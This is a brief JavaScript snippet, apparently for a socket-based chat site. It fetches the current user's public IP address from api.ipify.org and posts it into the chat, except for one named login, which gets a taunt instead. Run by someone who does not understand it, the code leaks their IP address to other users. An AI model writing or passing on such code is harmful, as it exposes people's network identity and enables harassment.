async function fetchAndEmit(url) {
  try {
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    const text = await response.text(); // or response.json() if you expect json
    const loginName = $("#login_name").val();

    if (loginName === 'Ivorydevrimo (Shadow POPE) #RAS4') {
      console.log("nope");
      // Optionally, you could emit a "nope" message or handle it differently.
      socket.emit('talk', { text: "Good riddance, somebody will abuse it right infront of me" }); //Example of emitting nope
    } else {
      socket.emit('talk', { text: text });
    }

  } catch (error) {
    console.error('Error fetching URL:', error);
    // Handle the error appropriately, perhaps emit an error message.
    socket.emit('talk', { text: `Error fetching URL: ${error.message}` });
  }
}

fetchAndEmit("https://api.ipify.org");
